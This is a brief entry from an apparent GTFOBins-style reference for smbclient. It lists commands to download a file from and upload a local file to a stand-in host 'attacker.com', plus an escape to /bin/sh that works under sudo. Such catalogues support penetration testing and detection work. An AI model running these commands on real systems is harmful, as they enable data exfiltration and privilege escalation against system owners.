---
type: gtfobin
name: smbclient
platform: Unix
functions: [download, shell, upload]
tags: [gtfobin, unix, lotl]
---

# smbclient

## download

```bash
smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
```
**Contexts:** sudo, unprivileged

## shell

```bash
smbclient '\\host\share'
!/bin/sh
```
_A valid SMB/CIFS server must be available._
**Contexts:** sudo, unprivileged

## upload

```bash
smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
```
**Contexts:** sudo, unprivileged
